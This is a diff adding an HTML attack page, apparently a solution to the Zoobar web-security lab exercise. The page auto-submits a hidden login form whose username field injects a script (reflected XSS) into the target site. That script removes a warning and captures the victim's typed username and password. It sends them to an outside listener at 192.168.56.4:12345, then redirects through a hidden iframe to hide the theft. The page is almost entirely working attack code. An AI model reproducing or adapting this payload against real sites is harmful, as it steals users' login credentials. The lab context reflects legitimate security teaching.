@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>
+          Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>
+      <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" style="visibility:hidden;">
+        <input type="text" name="login_username" size="20" autocomplete="no" value="">
+        <input type="password" name="login_password" size=20 autocomplete="no">
+        <input id="attack" type="submit" name="submit_login" value="Log in">
+        <input type="submit" name="submit_registration" value="Register">
+        <input type="hidden" name="nexturl" value="">
+      </form>
+
+    <script>
+
+      var code =  "<script>function sendData(){ " +
+      "var payload = encodeURIComponent(document.getElementsByName('login_username')[0].value) + ',' +" +
+      "encodeURIComponent(document.getElementsByName('login_password')[0].value);" +
+      "(new Image()).src='http://192.168.56.4:12345?payload=' + payload + '&roll=14785&random='+Math.random()+ '&' + 'timestamp='+Date.now();" +
+      "document.getElementsByName('kurisu')[0].addEventListener('load', function(){" +
+      "window.location.href = 'http://localhost:8080/zoobar/index.cgi/';" +
+      "}, false);" + "} ;" +
+      "document.addEventListener('DOMContentLoaded', function(){ document.getElementsByClassName('footer warning')[0].innerHTML='';document.getElementsByName('submit_login')[0].addEventListener('click', sendData, false);" +
+      "var frm = document.createElement('iframe');" +
+      "frm.setAttribute('name', 'kurisu');" +
+      "frm.setAttribute('src', 'http://localhost:8080/zoobar/index.cgi/');" +
+      "frm.setAttribute('style', 'visibility:hidden;height:2pt;width:2pt;');" +
+      "document.body.appendChild(frm);" +
+      "document.getElementsByName('loginform')[0].target = 'kurisu';" +
+      "});<" + "/script>" ;
+
+      document.addEventListener("DOMContentLoaded", function(){
+        document.getElementsByName("login_username")[0].value = '">' + code + '<input style="visibility:hidden;height:0pt;width:0pt;';
+        document.getElementById("attack").click();
+      });
+    </script>
+  </body>
+</html>
